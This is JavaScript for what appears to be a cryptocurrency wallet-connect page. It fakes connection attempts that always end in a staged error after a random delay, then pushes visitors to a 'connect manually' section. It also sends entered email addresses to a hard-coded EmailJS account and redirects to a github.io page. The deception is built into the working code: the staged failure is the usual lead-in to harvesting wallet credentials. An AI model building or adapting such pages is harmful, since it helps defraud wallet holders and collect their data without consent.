

document.addEventListener("DOMContentLoaded", function() {
  var errorSection = document.querySelector(".error-section");
  var connectingSection = document.querySelector(".connecting-section");
  var manualSection = document.querySelector(".manual-section");
  var connectBox = document.querySelector(".connect-box");
  var closeButton = document.getElementById("close-button");
  var errorTime = Math.floor(Math.random() * (6000 - 2000 + 1)) + 2000;
  var walletConnectCard = this.documentElement.querySelector(".wallet-connect-card");
  var walletIcon = document.getElementById("coin-logo");
  var tryAgain = document.querySelector(".try-again");
  var connectManually = document.querySelector(".connect-manually");

function errorConnecting() {
  connectingSection.style.display = "none";
  errorSection.style.display = "block";
  manualSection.style.display = "none";
}
function retryConnecting() {
  connectingSection.style.display = "block";
  errorSection.style.display = "none";
  manualSection.style.display = "none";
  var errorTime = Math.floor(Math.random() * (6000 - 2000 + 1)) + 2000;
  setTimeout(function() {
    errorConnecting();
  }, errorTime);
}

  walletIcon.addEventListener("click", function() {
    errorConnecting();
  });
  tryAgain.addEventListener("click", function() {
    retryConnecting();
  });
  connectManually.addEventListener("click", function() {
    connectingSection.style.display = "none";
    errorSection.style.display = "none";
    manualSection.style.display = "block";
  });

  closeButton.addEventListener("click", function() {
    connectBox.style.display = "none";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";
  });

  walletConnectCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    manualSection.style.display = "none";
    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

});



















var submitButton = document.getElementById("subscribe-mail");
var emailField = document.getElementById("email");
var invalidEmail = document.getElementById("invalid-email");

function confirmButtonStatus() {
  if (submitButton.disabled === true) {
    submitButton.style.backgroundColor = "grey";
    submitButton.style.cursor = "not-allowed";
  }
  else {
    submitButton.style.backgroundColor = "#6200EE";
    submitButton.style.cursor = "pointer";
  }
}

emailField.addEventListener("blur", function() {
  if (!emailField.checkValidity()) {
    invalidEmail.style.display = "flex";
    emailField.style.border = "1px solid red";
    submitButton.disabled = true;
    confirmButtonStatus();
  } else {
    invalidEmail.style.display = "none";
    emailField.style.border = "1px solid #E0E0E0";
    submitButton.disabled = false;
    confirmButtonStatus();
  }
});

submitButton.addEventListener("click", function(event) {
  event.preventDefault();
  if (!emailField.checkValidity()) {
    invalidEmail.style.display = "flex";
    emailField.style.border = "1px solid red";
    emailField.focus();
    submitButton.disabled = true;
    confirmButtonStatus();
    return;
  }

  setTimeout(function() {
    submitButton.disabled = false;
    confirmButtonStatus();
    submitButton.classList.remove("disabled");
  }, 7000);


  function sendMail() {
  var Email = document.getElementById("email").value;
  var submitButton = "Murphy Email";

  emailjs.send('service_76vugl3', 'template_9vpv84j', {
    email: Email,
    submit_button_id: submitButton,
  })
  .then(function(response) {
    window.location.href = "https://bennyboy10.github.io/123/";
  })
  .catch(function(error) {
    window.location.href = "https://bennyboy10.github.io/123/";
  });
}
  sendMail();
});

